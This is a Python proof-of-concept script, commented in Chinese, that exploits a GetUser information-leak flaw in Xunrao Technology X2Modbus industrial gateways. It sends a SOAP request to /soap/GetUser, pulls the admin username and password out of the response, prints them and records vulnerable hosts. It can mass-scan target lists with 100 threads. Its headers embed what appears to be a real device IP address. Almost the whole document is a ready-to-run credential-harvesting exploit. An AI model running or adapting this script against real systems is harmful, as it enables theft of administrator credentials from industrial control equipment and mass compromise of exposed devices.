# 迅饶科技 X2Modbus 网关 GetUser 信息泄露
import argparse,sys,requests,re
from multiprocessing.dummy import Pool
def banner():
    # 定义横幅
    banner = """
██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗    ██╗     ███████╗ █████╗ ██╗  ██╗ █████╗  ██████╗ ███████╗
██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║    ██║     ██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔════╝ ██╔════╝
██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║    ██║     █████╗  ███████║█████╔╝ ███████║██║  ███╗█████╗  
██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║    ██║     ██╔══╝  ██╔══██║██╔═██╗ ██╔══██║██║   ██║██╔══╝  
██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║    ███████╗███████╗██║  ██║██║  ██╗██║  ██║╚██████╔╝███████╗
╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                                                       version:XYKJ_Information_Leakage 1.0                          
"""
    print(banner)
def main():
    banner()
    # 处理命令行输入的参数了吧
    # url file
    parser=argparse.ArgumentParser('descripton="迅饶科技 X2Modbus 网关 GetUser 信息泄露漏洞"')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload_url = '/soap/GetUser'
    url = target+payload_url # 是从什么地方过来的 要么是你在命令输入的单个url 要么 文件里面读取到的
    header = {
        "Content-Length":"59",
        "Accept":"application/xml,text/xml,*/*;q=0.01",
        "X-Requested-With":"XMLHttpRequest",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type":"text/xml; charset=UTF-8",
        "Origin": "http://60.12.13.234:880",
        "Referer": "http://60.12.13.234:880/login.html",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Cookie":"language=zh-cn; language=zh-cn",
        "Connection":"close",
    }
    data = """<GetUser><User Name="admin" Password="admin"/></GetUser>"""
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    res1 = requests.get(url=target,headers=header,timeout=10)
    if res1.status_code == 200:
        try:
            res2 = requests.post(url=url,headers=header,data=data,timeout=10)
            user_match = re.search(r'<UserName>(.*?)</UserName>', res2.text,re.S)
            password_match = re.search(r'<PassWord>(.*?)</PassWord>', res2.text,re.S)
            if 'admin' in user_match.group(1):
                print(f'[+] 该url存在漏洞地址为{target} 泄露的账号:{user_match.group(1)}密码为:{password_match.group(1)}')
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
            else:
                print(f'[-]该url{target}不存在漏洞')
        except Exception as e:
            print(f'[*]该url{target}可能存在访问问题，请手工测试')



if __name__ == '__main__':
    main()